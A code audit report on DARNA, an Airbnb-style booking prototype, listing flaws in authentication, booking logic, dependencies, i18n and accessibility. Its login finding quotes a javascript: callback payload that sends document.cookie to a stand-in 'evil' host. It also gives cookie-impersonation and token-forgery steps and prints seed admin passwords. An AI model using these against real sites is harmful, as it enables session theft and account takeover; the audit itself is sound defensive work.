# DARNA, Full Code Audit Report

**Date:** 2026-10-28 · **Scope:** `darna/frontend` (guest + host app), `darna/admin` (back-office), repo hygiene, Airbnb feature parity
**Mode:** read-only, no source code was modified.
**Skills applied** (from `C:\Users\OASIS\Documents\skills`): `codebase-audit-pre-push`, `cc-skill-security-review`, `frontend-security-coder`, `api-security-best-practices`, `idor-testing`, `nextjs-best-practices`, `nextjs-seo-indexing`, `accessibility-compliance-accessibility-audit`, `i18n-localization` (incl. its `i18n_checker.py`), `performance-optimizer`.
**Tools run:** `tsc --noEmit`, `next lint`, `npm audit --omit=dev` (both apps), admin `check-i18n.mjs`, node key-parity scripts, grep of the built `.next/static` bundles.

---

## 0. Executive summary

DARNA has a **solid UI/product skeleton**: three verticals (stays, cars, experiences/agency trips) plus hotels and hostels, host onboarding, a host dashboard, messaging, wallet/commission, en/fr/ar with RTL, and a very broad admin panel (≈110 pages). TypeScript compiles cleanly in both apps and lint shows only hook-dependency warnings.

However, **it is a prototype, not a deployable product**:

1. **There is no real backend.** All data lives in in-memory mock stores (`// TODO: replace with Supabase`). Worse, most mutations run _in the browser_ against a client copy of the store, so bookings, accept/decline, messages, team changes and admin actions **disappear on refresh** and never reach the server.
2. **Authentication and authorization are effectively absent:**
   - Frontend login accepts any email with no password.
   - The session is an unsigned, readable cookie holding a user id.
   - Admin RBAC is hardcoded to `super_admin` on the client.
   - Admin passwords ship in public JS.
   - Admin logout doesn't work.
3. **Booking logic has many correctness holes:**
   - Prices are trusted from the client.
   - Blocked and booked dates are not enforced.
   - Zero-night bookings are possible.
   - One room booking blocks a whole hotel.
   - Experiences are priced per day instead of per person.
   - Fees of 0 are overwritten.
   - Timezone shifts move dates by a day.
4. **Dependencies have known critical CVEs:** Next 14.2.35 has RCE advisories, and next-intl has an open redirect advisory.
5. **i18n is mostly unwired in the frontend.** 97 of 115 components have hardcoded English, and 21 of 26 message namespaces are never used.
6. **Accessibility is weak:**
   - Cards and menus are `div`s.
   - Dialogs have no focus trap.
   - Form errors are invisible.
   - There are many contrast failures.

**Recommended order:**

1. Upgrade Next and next-intl.
2. Build the real backend: a database (Supabase/Postgres) with Row Level Security (RLS), real auth, and all mutations in server actions or route handlers.
3. Rebuild the booking/pricing/availability engine on the server.
4. Fix the admin RBAC, logout and audit trail.
5. Wire up i18n.
6. Accessibility and SEO.
7. Performance and cleanup.

### Severity counts (verified findings)

| Area                                     | Critical    | High | Medium | Low |
| ---------------------------------------- | ----------- | ---- | ------ | --- |
| Frontend – security & business logic     | 4 + 4 known | 8    | 21     | 7   |
| Frontend – UI / a11y / i18n / SEO / perf | –           | 11   | 19     | 12  |
| Admin app                                | 3 + 2 known | 10   | 16     | 8   |
| Dependencies / repo                      | 1           | 2    | 2      | 3   |

Findings marked ✅ were re-checked by me directly in the code.

---

## 1. Dependencies & tooling

| Sev             | Finding                                                                                                                                                                                                                                                                                                                                | Fix                                                                                                                                                    |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Critical** ✅ | `npm audit`: **next 14.2.35** has a critical advisory: _Unauthenticated RCE on Windows-hosted servers_ (GHSA-p293-qw3h-jr36). It also has RCE in the Image Optimization API via AVIF/SVG, plus several DoS, SSRF, cache-poisoning and server-action advisories. Frontend: 9 vulns (1 critical, 4 high). Admin: 3 (1 critical, 1 high). | Upgrade Next to a patched release. The audit suggests 16.x (breaking). Plan the migration, then re-read `node_modules/next/dist/docs` per `AGENTS.md`. |
| High ✅         | **next-intl ≤ 4.9.1** has an **open-redirect** advisory (GHSA-8f24-v5vv-gm5j) and prototype pollution.                                                                                                                                                                                                                                 | Upgrade to next-intl 4.x (breaking API: `createNavigation`, `setRequestLocale`, `defineRouting`).                                                      |
| High ✅         | `postcss` (bundled in next) has XSS and path-traversal advisories.                                                                                                                                                                                                                                                                     | Fixed by the Next upgrade.                                                                                                                             |
| Medium ✅       | `AGENTS.md` says "This is NOT the Next.js you know… re-added by `next dev`", but the installed Next is 14.2.35 and `generate-agent-files.js` does not exist. The file is stale and misleading.                                                                                                                                         | Delete it, or update it after the upgrade.                                                                                                             |
| Medium          | Frontend `package.json`: `@types/*`, `typescript`, `eslint-config-next` and `sharp` are in `dependencies`. `@types/date-fns` is obsolete. `recharts` is unused. `world-countries`, `react-world-flags` and `react-select` are only reached through the unused `CountrySelect.tsx` (≈1 MB of JSON). `query-string` is likely unused.    | Move them to devDependencies or remove them.                                                                                                           |
| Low ✅          | `tsc --noEmit` passes in both apps. `next lint` shows only `react-hooks/exhaustive-deps` warnings (3 frontend, 12 admin) and one `<img>` in admin `NetworkClient.tsx:319`.                                                                                                                                                             | Fix the hook deps, since some cause stale closures (`ApprovalsClient` `handleApprove`, `CommandPalette` `handleSelect`).                               |

## 2. Repository hygiene (`codebase-audit-pre-push`)

| Sev       | Finding                                                                                                                                                | Fix                                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------- |
| High ✅   | `frontend.backup-before-admin-removal/` is a full copy of the frontend (265 tracked files, including ~8 MB of duplicated images) committed to git.     | Delete it; git history already keeps the old version.                                                     |
| Medium ✅ | `admin/test-results/.last-run.json` is committed. `admin/.gitignore` has no `test-results/` or `playwright-report/`.                                   | Add them to `.gitignore` and untrack the file.                                                            |
| Medium ✅ | `.gitignore` uses `.env*`, which also ignores **`.env.example`**, so the env template is never committed. `.env.local` files are correctly ignored.    | Add `!.env.example`.                                                                                      |
| Low ✅    | The repo has no root `.gitignore` or README. `frontend/README.md` is the create-next-app boilerplate. Git user is "Your Name". 3 untracked admin docs. | Write a real README with architecture, run steps, env vars and seed accounts. Set `git config user.name`. |
| Low       | Duplicated image assets across `frontend/public`, `admin/public` and the backup folder.                                                                | Share them, or keep only what each app uses.                                                              |

---

## 3. Frontend, Security, Auth & Authorization

### Critical

1. ✅ **Login has no password check.**
   - `app/api/auth/login/route.ts` and `register/route.ts` call `authenticateUser(email)`, which never checks a password.
   - `lib/data/auth.ts:57-65` matches by **substring**: any email containing "amina", "karim" or "yacine" (e.g. `notamina@x.com`) logs in as that seeded user.
2. ✅ **The session is just the user id in a cookie.**
   - The cookie (`darna_user_id`) is unsigned and **not httpOnly**, with no `secure` flag and a 1-year lifetime.
   - Anyone can set `darna_user_id=usr_karim` in devtools and become Karim.
   - `getCurrentUser` (`auth.ts:29-43`) even **creates** a user for any unknown id.
   - The login page also writes the cookie directly from JS (`login/page.tsx:50`).
3. ✅ **Middleware trusts client cookies for roles.** `middleware.ts` grants host access when the `darna_host_type` cookie is set. Since the cookie is client-writable, anyone can become a host or an agency.
4. ✅ **`/api/host/complete` lets anyone act as any user.**
   - It takes `userId` from the request body, falling back to the hardcoded `"usr_yacine"` (`route.ts:14`).
   - It **auto-marks organizations as verified** (`route.ts:54`).
   - It passes the body's `listing` straight to `createListing` (mass assignment, see #12).
5. ✅ **Open redirect / `javascript:` XSS on login.** `login/page.tsx:54-58` (and `:100-105`) does `window.location.href = callbackUrl`. With `?callbackUrl=javascript:fetch('//evil?c='+document.cookie)`, script runs on DARNA's origin after login.
6. **Mutations run in the browser and never reach the server.**
   - About 20 `"use client"` components import `lib/data/*` directly (`ListingReservation`, `HotelHostelDetailClient`, `TripDetailClient`, `TripsClient`, `ReservationsClient`, `HostBookingsClient`, `HostListingsClient`, `AgencyTeam/Settings/TripsClient`, `MessagesClient`, `BecomeHostFlow`…).
   - Result: a guest books, sees "Reservation confirmed", lands on `/trips` (server-rendered), and the booking isn't there. The same happens to accept/decline, messages, team changes and org deletion.
   - Two browsers can book the same dates, because each checks only its own copy.
7. ✅ **IDOR on messages.** `messages/[conversationId]/page.tsx:24` calls `getMessages(params.conversationId)` without checking that the user is a participant. Conversation ids are sequential.
8. **IDOR on organizations via cookie.**
   - The `darna_agency_id` cookie selects the org for every `/host/*` page (`host/layout.tsx:84-88`, `host/page.tsx:33`, `bookings`, `listings`, `calendar`, `agency/team|settings|trips`). There is no membership check.
   - Setting `darna_agency_id=org_el_djazair_hotel` exposes that hotel's bookings (guest names and phones), team emails, settings, wallet and its delete controls.
   - Trips pages default to `"org_atlas_escapes"`. Team and settings fall back to `allOrgs[0]`.

### High

9. ✅ `/reservations` calls `getReservations()` with **no filter** (`reservations/page.tsx:24`). Every logged-in user sees every platform reservation, with guest email and phone, and can accept or decline any of them.
10. The host "Today" dashboard (`host/page.tsx:36`) also loads all reservations. A host can accept other hosts' requests.
11. **Notifications aren't scoped.**
    - `notifications/page.tsx:6` and `NotificationsDropdown.tsx:52` call `getNotifications()` with no user id and no login check, so everyone sees Yacine's notifications.
    - "Mark all read" marks everyone's.
12. **Mass assignment.** `createListing` spreads `...data` last (`lib/data/listings.ts:249`). Callers can set `id`, `rating`, `reviewCount`, `featured` or `organizationId`. Posting `id: "lst_tipaza_villa"` **hijacks an existing listing page**.
13. **Booking totals and status are trusted from the client.** `createReservation` (`reservations.ts:96-161`) stores whatever `totalPrice`, fees, `status` and `approvalMode` it receives. A client can book for 1 DZD or skip request-to-book.
14. **PII is leaked on public pages.**
    - `listings/[listingId]/page.tsx` and `users/[userId]/page.tsx` pass the full `User` object (email, phone, address) into client props.
    - `AgencyProfileClient.tsx:159` shows every member's email publicly.
15. `/users/me` falls back to **Amina's profile in owner mode** for anonymous visitors, with her phone pre-filled (`users/[userId]/page.tsx:23-37`).
16. **The whole mock DB ships in the client JS bundle** (all emails, phones and wallet balances). Add `import "server-only"` to `lib/data/*` and `lib/mock-data/*`.

### Medium / Low (security-adjacent)

- No role checks inside an org: any member can delete the org or promote themselves to owner (`organizations.ts:170-215`). Editing the registration number keeps the org's "verified" status.
- Host pages **create data during a GET render**. `host/layout.tsx:47-66` auto-creates a public 18,500 DZD listing, and `:99-114` auto-creates a verified org with placeholder legal data.
- **Agency onboarding gaps.**
  - The org id is pre-filled with `org_${Date.now()}`, so a failed API call leaves the cookie pointing at a non-existent org.
  - Blank form fields default to Atlas Escapes' registration number (`BecomeHostFlow.tsx:533-538`).
- **Wallet balance and commission rates live in `localStorage`** (`wallet.ts:230-296`), so a host can edit them. Commission is also deducted in the _guest's_ browser.
- "Change password" and "Revoke session" in Settings show success toasts but do nothing (`SettingsClient.tsx:486-491, 1074-1076`).
- **Favorites and host drafts aren't user-scoped.** `darna_favorites` and `darna_host_draft` in `localStorage` aren't keyed per user and aren't cleared on logout.
- The API routes return raw `error.message` to clients.
- Ids are `prefix_${Date.now()}`, which is guessable and collides between client and server. Use `crypto.randomUUID()`. Arabic trip titles produce empty slugs.
- **Clean:** no `dangerouslySetInnerHTML`, `eval` or `innerHTML`, and no hardcoded secrets in the frontend.

---

## 4. Frontend, Booking / pricing / availability correctness

| Sev       | Finding                                                                                                                                                                                                                                                                               | Location                                                                                  |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------- | ------------------ |
| High      | **Blocked and booked dates are not enforced.** `getAvailabilityOverrides` is never called, the guest calendar gets no `disabledDates`, and host "block dates" and price overrides only change local state (with success toasts).                                                      | `lib/data/calendar.ts:22`, `ListingReservation.tsx:319`, `HostCalendarClient.tsx:190-205` |
| High      | **A hotel with 12 rooms becomes unavailable after one room booking.** The overlap check ignores `selectedRoomTypeId` and `inventoryCount`.                                                                                                                                            | `reservations.ts:116-127`, `listings.ts:183-192`                                          |
| High      | **Experiences are charged price × days, not × guests** (the label says "/ person").                                                                                                                                                                                                   | `ListingReservation.tsx:139-143`                                                          |
| High      | **Zero-night bookings pass.** Start = end is forced to 1 day, and the server skips the overlap check when `start >= end`, so the same day can be booked repeatedly.                                                                                                                   | `ListingReservation.tsx:133-137`, `reservations.ts:119`                                   |
| Medium ✅ | `cleaningFee: 0` becomes 3500 and `serviceFee: 0` becomes 10%, because the code uses `\|\|` instead of `??`.                                                                                                                                                                          | `reservations.ts:149-151`                                                                 |
| Medium    | Hostel bed bookings charge for 1 bed regardless of count.                                                                                                                                                                                                                             | `HotelHostelDetailClient.tsx:200-203`                                                     |
| Medium    | **Trips break for group bookings.** A second traveller can't book the same departure (the listing overlap check rejects it). There is no seat-capacity check against `maxGroupSize`, and the trip end date is one day too long.                                                       | `TripDetailClient.tsx:57,87-92`                                                           |
| Medium    | The guest count has no maximum ("Max N" is shown but not enforced).                                                                                                                                                                                                                   | `Counter.tsx`, `ListingReservation.tsx:349`                                               |
| Medium    | **Timezone (Algeria UTC+1).** Dates are stored with `toISOString()`, so a Nov 15 check-in is saved as `2026-11-14T23:00Z`. `availableFrom` parsed as UTC rejects the first valid day. Back-to-back stays are hidden in search.                                                        | `ListingReservation.tsx:43-50,177`, `listings.ts:189`                                     |
| Medium    | Request-to-book never expires. `expiresAt` is set but never enforced, and pending requests block dates forever.                                                                                                                                                                       | `reservations.ts:137-139`                                                                 |
| Medium    | **Cancellation ignores policy.** Every cancellation is marked "refunded", even past stays. Stays never move to `completed`.                                                                                                                                                           | `reservations.ts:191-203`, `TripsClient.tsx:35-50`                                        |
| Medium    | **Commission errors.** Commission is charged on the total _including_ DARNA's service fee and the cleaning fee. It is never reversed on cancel, is double-charged on re-confirm, and hotels get the agency rate.                                                                      | `reservations.ts:173-178,225`, `wallet.ts:383,400`                                        |
| Medium    | Hotel and hostel hosts see empty bookings, listings and calendar pages, because only `"agency"` is treated as an org.                                                                                                                                                                 | `host/bookings                                                                            | listings | calendar/page.tsx` |
| Medium    | Draft or unpublished listings and trips are public and bookable (no status filter).                                                                                                                                                                                                   | `listings.ts:12-22,199-217`, `trips.ts:66`                                                |
| Medium    | Deleted listings reappear, because `getListings` re-merges `mockListings`.                                                                                                                                                                                                            | `listings.ts:17,276-280`                                                                  |
| Medium    | Membership changes are not saved to `globalThis`, so they are lost on HMR and across bundles.                                                                                                                                                                                         | `organizations.ts:109,166,189,213`                                                        |
| Medium    | Switching conversation thread shows an empty thread, because messages are only fetched for the first one.                                                                                                                                                                             | `MessagesClient.tsx:44,83-95`                                                             |
| Low       | Listing price can be 0 or negative. Trips allow `minGroupSize > maxGroupSize`. A free-text cover-image URL outside `remotePatterns` crashes the trips list. The EUR rate is hardcoded at 153 in one place and 152.47 in another. `getReviewsByUserId` always adds the Tipaza reviews. | various                                                                                   |

---

## 5. Frontend, i18n / RTL (`i18n-localization`)

- **High: most of the UI is untranslated.**
  - Only **18 of 115** `.tsx` files use `useTranslations`. There are about **560 hardcoded JSX text lines** and **185 hardcoded `alt`/`aria-label`/`placeholder` strings**.
  - Worst files: `BecomeHostFlow.tsx` (99), `SettingsClient.tsx` (51), `HotelHostelDetailClient.tsx` (31), `HostSettingsClient.tsx` (30), `HostListingsClient.tsx` (28), `HostBookingsClient.tsx` (27).
  - `i18n_checker.py` underreports this, because its regex misses most JSX. The numbers above come from a manual and node scan.
- **High: 21 of 26 message namespaces are never referenced** (`host`, `profile`, `hostFlow`, `trips`, `reservations`, `favorites`, `filters`, `footer`…). The translations exist but aren't wired up. The `admin*` namespaces are leftovers from the admin split.
- Key parity is good: en, fr and ar each have 949 keys.
- **High: the Arabic font never applies.**
  - `font-sans` on `<body>` overrides the `[dir=rtl]` Tajawal rule.
  - `tailwind.config` `fontFamily.arabic` uses the literal "Tajawal" instead of `var(--font-arabic)`.
  - The hero `h1` uses weight 900, which isn't loaded.
- **High: locale-blind formatting causes hydration mismatches.**
  - 46 `toLocaleString()`/`toLocaleDateString()` calls have no locale.
  - 31 date-fns `format()` calls have no locale.
  - `NotificationsDropdown` builds English relative times.
- **Medium:**
  - The `react-date-range` calendars get no locale, so they are English in fr and ar.
  - Currency is inconsistent: "DZD" in 72 places vs "DA", concatenated by hand instead of using `formatDzd`.
  - The `not-found` and `error` pages are English. `/fr/unknown` falls to the English root 404 (add `app/[locale]/[...rest]/page.tsx` → `notFound()`).
  - The hero's Arabic tagline lacks `lang="ar"` and is identical in all locales.
  - 28 dead `t("x") || "fallback"` patterns.
- **RTL is mostly good:** 769 logical classes vs 4 physical ones. Remaining issues:
  - `TripCard.tsx:125` and `TripDetailClient.tsx:136` icons don't flip.
  - `globals.css` uses `left`/`right` for toast and dropdown positioning.
  - `LanguageSwitcher` drops the query string.

## 6. Frontend, Accessibility (WCAG 2.2 AA)

- **High:**
  - **Listing cards are `<div onClick>`** (`ListingCard.tsx:176`, `ListingCarouselCard.tsx:65`), so keyboard users can't open listings and crawlers can't follow them.
  - **38 clickable `div`/`span` elements** without role, tabIndex or key handling: user menu items, logo, category boxes, footer, "Create an account", gallery, calendar cells, onboarding options.
- **High: dialogs.**
  - The shared `Modal.tsx` has Escape and `aria-modal`, but no focus trap, initial focus or focus return.
  - 10 more custom overlays have no `role="dialog"` or Escape handling.
  - The lightbox has no keyboard support.
- **Medium: form errors are invisible.** `Input.tsx` uses `border-status-error`/`text-status-error`, but the palette only defines `status.red/amber/green`, so Tailwind drops the classes. There is no error text and no `aria-invalid`/`aria-describedby`. The app has only one `aria-live`/`role="alert"`.
- **Medium: Tailwind classes that don't exist in v3:** `backdrop-blur-xs` (16 uses, so modal blur is silently off), `shadow-darna-sm`, `text-md`.
- **Medium: contrast.**
  - `text-neutral-400` (161 uses): 2.5:1.
  - White on `bg-accent` buttons: 3.58:1.
  - `text-accent` on the beige background (76 uses): 3.31:1.
  - White on amber: 2.93:1.
- **Medium: focus and labels.**
  - `outline-none` appears 80 times with only 2 `focus-visible` replacements, so keyboard focus is invisible.
  - Login labels have no `htmlFor`/`id`.
  - The password toggle has no `aria-label`.
- **Low:** dropdowns lack `aria-expanded`, and some alt text is English-only or wrong on decorative images.

## 7. Frontend, Next.js, SEO, performance

- **High: SEO metadata.**
  - **No page has `metadata`/`generateMetadata`.** Every listing, agency, profile and trip shares one English title, with no OG image, canonical or hreflang. `og.locale` is fixed to `en_US`.
  - **No `sitemap.ts` or `robots.ts`.** Footer "Sitemap", "Privacy" and "Terms" are dead `<span>`s.
- **High: hero LCP image.** It uses raw `<picture>` with a **1.69 MB PNG on mobile** (`HomeHero.tsx:72-81`).
  - There are 12 public assets over 300 KB (8.2 MB total).
  - The navbar logo is a 353 KB PNG.
  - The Leaflet marker is a 136 KB PNG shown at 36×52.
  - Fix: convert to SVG/WebP and use `getImageProps()` for art direction.
- **Medium: rendering and structure.**
  - `force-dynamic` on `app/[locale]/layout.tsx:29` makes every page dynamic, so there is no static or ISR caching for home, listings or help.
  - `login/page.tsx` is a client page, so it can't have metadata.
  - There is no `global-error.tsx`.
  - Huge client components: `BecomeHostFlow.tsx` (3,492 lines), `SearchMap.tsx` (1,229), `HotelHostelDetailClient.tsx` (1,157), `SettingsClient.tsx` (1,116). Split them and `dynamic()`-import the steps.
  - Zustand stores are used without selectors in 20 places, so large trees re-render on every modal toggle.
- **Low: cleanup.**
  - Unused files: `ClientOnly.tsx`, `Loader.tsx`, `MainCategoryTabs.tsx`, `useRentModal.ts`, `CountrySelect.tsx`, about 36 unused SVGs, `avatar.jfif`, `darna-bg.png`, `404-illustration.jpg`.
  - Unused `Navbar` imports.
  - Icons are declared three ways, and `manifest.json` is never linked.
  - Tajawal is preloaded for every locale.
  - 33 `any` and 8 `console.*`.
  - `next.config` allows `picsum`/`unsplash` and doesn't enable AVIF/WebP.
  - Airbnb leftovers: the `common.airbnb` and `footer.airCover` keys.
- **Good:** Leaflet is correctly loaded with `dynamic(..., {ssr:false})`, there are no `<img>` tags, and there is no `Math.random` in render.

---

## 8. Admin app

### Critical

1. ✅ **RBAC is not enforced server-side.**
   - `login/actions.ts` is the only `'use server'` file. Every admin mutation in `lib/data/*` (approve host, approve payout, recharge wallet, change member role, delete user…) is called from `"use client"` components.
   - Each client passes a **hardcoded actor `{ role: "super_admin" }`** (`ApprovalsClient.tsx:235,275,307`, `BookingsClient.tsx:587`, `CarsListClient.tsx:535`, `FinanceClient`, `TeamClient`…). An _analyst_ can approve payouts or promote themselves.
   - `hasPermission` is never used in any UI, so every role sees every action.
2. ✅ **All seed admin passwords are in public JS.**
   - `lib/mock-data/store.ts:17` imports `MOCK_ADMIN_ACCOUNTS` from `lib/auth/session.ts`, and client components import the store.
   - Confirmed: `DarnaMod2026!` and the fallback JWT secret are in `.next/static/chunks/app/[locale]/(panel)/bookings/page.js` (also `cars` and `experiences`).
   - With the JWT secret, anyone can **forge a super_admin session token**.
3. ✅ **Logout doesn't work.** `Header.tsx:78-81` clears the httpOnly cookie from JS, which is impossible, then middleware sends the user back to the dashboard. On a shared PC, the next person stays logged in for up to 8 hours.
4. ✅ (known) **Hardcoded fallback JWT secret and plaintext seed passwords** in `lib/auth/session.ts` (moderator, support, finance and analyst passwords have no env override). The same secret is copied into `tests/responsive/sweep.spec.ts:36`.

### High

5. ✅ **The login page pre-fills `admin@darna.dz` / `DarnaAdmin2026!`** (`login/page.tsx:21-22`) and shows one-click "quick account" buttons with passwords (`:137-151`).
6. ✅ **Open redirect after login.** `router.push(searchParams.get("returnTo"))` is not validated (`login/page.tsx:19,41`).
7. **Sessions can't be revoked.** Role and `isActive` are frozen in the JWT for 8 hours. `toggleMemberActive` and `updateMemberRole` modify `store.team`, but login checks `MOCK_ADMIN_ACCOUNTS`, so deactivated admins can still log in.
8. ✅ **The rate limiter uses a constant IP** (`actions.ts:16`, `"197.200.45.12"`). Five bad attempts by anyone **lock out all admins**. There is no per-account limit and passwords are compared with plain `===`.
9. **Payout approval is fake.**
   - `approvePayout` doesn't check status, doesn't change it and doesn't debit the wallet. It only writes an audit entry.
   - After a reload the payout is "pending" again and can be approved twice.
   - The `/payments` tab approves in one click with no confirmation.
10. **Payouts show a fake RIB.** Every row renders the same `"007 99999 0001234567 89"`, because the code reads `p.rib` instead of `accountDetails.ccpRip` (`PaymentsClient.tsx:727`).
11. **Refunds and cancellations have no state machine.**
    - Refund amounts can be negative, larger than the total, or a second refund of the same booking.
    - A completed booking can be cancelled.
    - A declined dispute is still marked "completed".
    - None of these write ledger entries.
12. **Moderation transitions are unchecked.** `restoreHost` always sets "approved", even for banned or rejected hosts, and listings behave the same way.
13. **Money inputs are not validated.** `rechargeWallet` accepts `NaN` or `Infinity`, and commission rates accept negative values or values above 100.
14. **The audit trail is not trustworthy.**
    - The actor is supplied by the client, so every entry says "Amine Admin / super_admin".
    - The IP is hardcoded.
    - The store has a public setter.
    - Login, logout and CSV exports are not audited.
    - Yet the UI calls the trail "immutable".

### Medium

- **Auth gate gaps.** The `(panel)/layout.tsx` renders even with a null session, so middleware is the only gate. Middleware skips **any path containing a `.`** (`middleware.ts:21-25`), so `/en/stays/a.b` renders the panel unauthenticated. `isLoginPage` also matches `/loginx`.
- **CSV exports.** No formula-injection protection (`=`, `+`, `-`, `@`), host-controlled names are not quote-escaped, only the current page is exported, and exports are not audited.
- **Wrong finance KPIs.**
  - "Total wallets" sums one page only.
  - Monthly commissions (1,845,000) and refunds total (432,000) are hardcoded.
  - Facets use stale balances.
  - Seed `balanceAfter` values contradict the date order.
- **Inconsistent money formatting.** `toLocaleString("fr-FR") + " DZD"` is used instead of `formatDzd(amount, locale)`, and amounts are floats.
- **Duplicate features with diverging behaviour:**
  - `/finance` vs `/payments/*` (881 and 891 lines)
  - `/audit-log` vs `/settings/audit-log`
  - `/team` vs `/settings/team`
  - `/onboarding` vs `/settings/onboarding`
  - `/providers` vs `/moderation/providers`
- **Accessibility.**
  - `Dialog`/`Drawer`/`ConfirmDialog` have no `role="dialog"`, `aria-modal` or focus trap.
  - The command palette lacks the combobox/listbox ARIA pattern.
  - Clickable table rows aren't keyboard-reachable.
  - Login errors aren't announced.
- **No error, loading or not-found boundaries** in the admin app. `stays/[id]` doesn't call `notFound()`.
- **i18n.**
  - Key parity is 100% (525 keys), but there are about 50+ hardcoded French/English strings: `HostsClient` (~29), `PaymentsClient` (~23), and `ProvidersValidationClient` and `StayWizardClient` with no i18n at all.
  - The fr/ar `comparison*` strings hardcode the period instead of using `{period}`.
  - 34 directional icons don't flip in RTL, and there are physical `text-left`/`text-right` classes.

### Low

- Server pages fetch data and discard it (`bookings/page.tsx`), and client components refetch on mount.
- Hydration risk: `new Date()` is formatted during render in `DashboardClient`.
- Favicon paths point to `/icons/*`, but the files are in the `public/` root.
- `_design` folders are dead code.
- The last-super-admin guard counts inactive admins.
- **Tests are shallow.**
  - 6 happy-path e2e tests plus a responsive sweep of 16 of ~110 routes.
  - No negative RBAC, logout or open-redirect tests.
  - `playwright.config.ts` has no `webServer`.
- **Docs.** `docs/responsive/ISSUES.md` marks everything FIXED, but it covered only 16 routes.

---

## 9. Cross-app architecture: frontend ↔ admin data models diverge

These need to be unified **before** building a shared backend:

| Concept                | Admin                                                                                              | Frontend                                                  |
| ---------------------- | -------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| Listing status         | 11 values (`pending`/`pending_review`, `published`/`approved`, `refused`/`rejected`…), no `active` | `active \| pending \| suspended \| draft`                 |
| Booking status         | has `disputed` and `refunded`, no `declined` or `expired`                                          | has `declined` and `expired`, no `disputed` or `refunded` |
| Transaction types      | `wallet_recharge`, `host_payout`, `booking_payment`, `booking_refund`                              | `recharge`, `payout`                                      |
| Onboarding field types | `multiselect`, `file`, `boolean`, `radio`, `location`, `amenities`                                 | `multi-select`, `image-upload`, `toggle`                  |
| Service fee            | 7% of base                                                                                         | 10% of total, nightly = 85%                               |
| Commission defaults    | copied in `generator.ts`, `store.ts`, and the frontend's `wallet.ts`                               |                                                           |

**Recommendation:**

- Create a shared package (`packages/shared`: types, enums, pricing and commission functions, zod schemas) used by both apps, ideally in a monorepo (pnpm/turbo workspaces).
- Create one database schema with Row Level Security (RLS) and a single source of truth for pricing.

---

## 10. Airbnb feature parity (researched online)

Sources: Airbnb newsroom (total price display standard since Apr 2025; 2025 Summer Release with Services and relaunched Experiences), Guesty, RentalScaleUp, Hostfully (review policy 2026).

| Feature                                                                                                                                                                            | DARNA status                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| Category tabs, map search, photo gallery, amenities, location map, host "Today" dashboard, listing wizard, en/fr/ar + RTL, experiences, car rental (DARNA-only), admin back-office | **Done (mock)**                                             |
| Instant Book vs request-to-book                                                                                                                                                    | Done (mock), but requests never expire                      |
| Filters                                                                                                                                                                            | Partial: no accessibility or family filters                 |
| Guest types                                                                                                                                                                        | Partial: one counter, no adults/children/infants/pets split |
| House rules, cancellation policy                                                                                                                                                   | Partial: no refund engine, hardcoded "48h" text             |
| Review display                                                                                                                                                                     | Partial: 5 sub-ratings instead of 6                         |
| ID verification                                                                                                                                                                    | Partial: a flag plus the admin approval queue               |
| Messaging                                                                                                                                                                          | Partial: no attachments, translation or real-time           |
| Wishlists                                                                                                                                                                          | Partial: single list                                        |
| Multi-currency                                                                                                                                                                     | Partial: selector not wired                                 |
| Co-hosts                                                                                                                                                                           | Partial: agencies only                                      |
| **Total price incl. fees on cards**                                                                                                                                                | **Missing** (Airbnb standard): cards show "/ night"         |
| **Guest checkout & payment**                                                                                                                                                       | **Missing (critical)**: no payment step at all              |
| **Calendar blocks booked dates**                                                                                                                                                   | **Missing**                                                 |
| **Min/max nights, advance notice, check-in/out times**                                                                                                                             | **Missing**                                                 |
| **Write a review** (double-blind, 14-day window, host rates guest)                                                                                                                 | **Missing**                                                 |
| Flexible dates, smart pricing, weekly/monthly discounts, iCal sync, guarantee (AirCover-like), Services vertical                                                                   | Missing or toast-only                                       |
| Payouts, refunds, notifications (push/SMS/email), report listing                                                                                                                   | Mock-only                                                   |

### Top 10 product gaps to build next

1. **Real checkout and payments.** SATIM CIB/Edahabia, BaridiMob, cash-on-arrival with a deposit, and CCP transfer with receipt upload. Store the payment status on the reservation.
2. **Availability engine.** Booked and blocked dates disabled in the calendar, a server-side double-booking guard, and per-room-type inventory.
3. **Listing rules.** Min/max nights, advance notice, check-in/out times, and a guest-count maximum.
4. **Write-a-review flow.** Double-blind, 14-day window, host rates guest.
5. **Pricing display.** Total price shown on cards and the map, and per-listing cleaning/service fees.
6. **Cancellation-policy engine** with dated refund cutoffs, wired to admin refunds.
7. **Real backend and auth.** Supabase with RLS, phone OTP (important in Algeria), and CNI/passport verification.
8. **Messaging and notifications.** Real-time messaging with attachments, plus SMS and push notifications.
9. **A working "Report" flow** feeding admin moderation, and a published DARNA guarantee or trust policy.
10. **Host pricing tools.** Weekly/monthly/last-minute discounts, seasonal pricing (summer coast, Ramadan, Sahara winter), and real iCal import/export.

**Algeria-specific ideas:**

- A "families only" / "proof of marriage for couples" policy field and filter.
- Halal-friendly and women-only filters.
- Wilaya selector in search.
- Sahara permit and guide requirements on trips.
- EUR pricing info for diaspora guests.
- QA of Arabic numerals and dates.

---

## 11. Suggested roadmap

**Phase 0 – Stop the bleeding (1–2 days)**

- Upgrade Next and next-intl.
- Remove the pre-filled admin credentials and quick-login buttons.
- Mark `lib/auth/*`, `lib/data/*` and `lib/mock-data/*` as `server-only` in both apps.
- Validate `callbackUrl`/`returnTo`.
- Delete the backup folder and fix `.gitignore`.

**Phase 1 – Real backend and auth (Supabase/Postgres)**

- Schema with Row Level Security (RLS), shared types package, real auth (email + password/OTP), httpOnly signed sessions.
- All mutations in Server Actions or route handlers that derive the user from the session.
- Admin `requirePermission()` on the server, real logout, session revocation, server-written audit log.

**Phase 2 – Booking engine**

- Server-side price calculation.
- Availability (overrides, inventory, min/max nights, timezone-safe `yyyy-MM-dd` dates).
- Request expiry, cancellation-policy refunds, commission on the subtotal with reversals.
- Payments.

**Phase 3 – Quality**

- Wire up i18n (use the existing unused namespaces) and add a no-literal-string lint rule.
- One accessible Dialog primitive, links and buttons instead of clickable `div`s, contrast fixes, visible focus.
- `generateMetadata`, sitemap and robots.
